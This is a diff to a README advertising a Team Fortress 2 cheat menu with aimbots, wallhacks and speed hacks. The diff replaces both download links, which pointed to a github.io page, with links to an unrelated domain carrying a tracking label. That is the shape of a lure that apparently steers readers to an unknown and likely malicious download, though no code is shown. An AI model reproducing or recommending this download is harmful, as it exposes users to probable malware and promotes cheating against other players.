@@ -2,7 +2,7 @@
 
 The **TF2 Cheats** menu provides players with powerful tools to enhance their *Team Fortress 2* experience by offering advanced features to help you dominate the battlefield. Whether you're looking to improve your aim, gain full map awareness, or simply have fun experimenting with different playstyles, these cheats will take your game to the next level.
 
-[![Download TF2 Cheats](https://img.shields.io/badge/Download-TF2%20Cheats-blueviolet)](https://tf2-cheats.github.io/.github/)
+[![Download TF2 Cheats](https://img.shields.io/badge/Download-TF2%20Cheats-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From aimbots and wallhacks to speed hacks and more, the TF2 Cheats menu gives you complete control over your gameplay, whether you’re in a casual match, private server, or a custom environment.
 
@@ -49,4 +49,4 @@ The **TF2 Cheats** menu is compatible with *Team Fortress 2* on PC, ensuring smo
 4. Press the designated hotkey (usually *Insert*) to bring up the cheat menu.
 5. Adjust settings as needed and start dominating the game!
 
-[![Download TF2 Cheats](https://img.shields.io/badge/Download-TF2%20Cheats-blueviolet)](https://tf2-cheats.github.io/.github/)
+[![Download TF2 Cheats](https://img.shields.io/badge/Download-TF2%20Cheats-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
